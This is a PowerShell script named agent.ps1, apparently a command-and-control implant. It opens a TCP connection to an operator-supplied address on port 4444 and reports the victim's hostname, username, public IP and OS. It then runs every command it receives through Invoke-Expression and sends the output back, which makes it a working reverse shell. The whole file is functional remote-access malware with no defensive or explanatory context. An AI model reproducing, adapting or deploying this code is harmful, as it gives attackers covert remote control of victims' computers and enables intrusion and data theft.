# Updated agent.ps1
$C2 = "YOUR IP ADDRESS"
$Port = 4444

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $ip = (Invoke-RestMethod "http://ipinfo.io/json").ip
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    return "$hostname|$username|$ip|$os"
}

function Start-Session {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($C2, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine((Get-SystemInfo))

        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ($cmd -eq "exit") { break }

            $result = try {
                Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $_.Exception.Message
            }

            $writer.WriteLine($result)
        }

        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
    } catch {
        Start-Sleep -Seconds 15
    }
}

Start-Session
